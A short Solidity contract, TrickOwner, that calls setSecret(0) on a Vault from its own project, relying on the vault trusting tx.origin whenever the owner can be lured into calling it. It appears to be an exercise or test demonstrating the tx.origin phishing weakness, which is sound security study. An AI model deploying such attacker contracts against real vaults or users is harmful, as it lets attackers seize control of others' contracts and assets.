// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {IVault} from "@/Vault.sol";

contract TrickOwner {
    IVault public immutable vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    // Calls vault.setSecret(_v); If owner is the origin, this will succeed
    function trickOwner() external {
        vault.setSecret(0);
    }
}
